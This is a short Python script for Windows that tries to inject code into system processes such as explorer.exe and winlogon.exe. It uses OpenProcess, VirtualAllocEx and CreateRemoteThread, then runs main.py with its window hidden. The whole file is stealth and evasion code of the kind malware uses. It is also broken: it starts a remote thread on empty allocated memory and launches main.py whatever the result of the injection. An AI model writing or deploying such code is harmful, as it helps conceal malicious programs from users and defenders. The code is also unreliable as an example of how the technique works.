import ctypes
import ctypes.wintypes
import os
import subprocess
import sys
import time

def inject_into_system_process():
    try:
        # Find legitimate Windows process
        processes = ['explorer.exe', 'winlogon.exe', 'dwm.exe']
        
        for proc_name in processes:
            try:
                # Get process ID
                result = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {proc_name}'], 
                                      capture_output=True, text=True)
                if proc_name in result.stdout:
                    # Extract PID
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if proc_name in line:
                            pid = int(line.split()[1])
                            return inject_code(pid)
            except:
                continue
        return False
    except:
        return False

def inject_code(target_pid):
    try:
        kernel32 = ctypes.windll.kernel32
        
        # Open target process
        process_handle = kernel32.OpenProcess(0x1F0FFF, False, target_pid)
        if not process_handle:
            return False
            
        # Allocate memory in target process
        code_size = 4096
        allocated_mem = kernel32.VirtualAllocEx(
            process_handle, None, code_size, 0x3000, 0x40
        )
        
        if allocated_mem:
            # Create remote thread to execute our code
            thread_handle = kernel32.CreateRemoteThread(
                process_handle, None, 0, allocated_mem, None, 0, None
            )
            
            if thread_handle:
                kernel32.CloseHandle(thread_handle)
                kernel32.CloseHandle(process_handle)
                return True
                
        kernel32.CloseHandle(process_handle)
        return False
    except:
        return False

def run_stealth():
    if inject_into_system_process():
        # Run main application from injected process
        os.system('python main.py')
    else:
        # Fallback: run with maximum stealth
        subprocess.Popen([sys.executable, 'main.py'], 
                        creationflags=0x08000000)  # CREATE_NO_WINDOW

if __name__ == "__main__":
    run_stealth()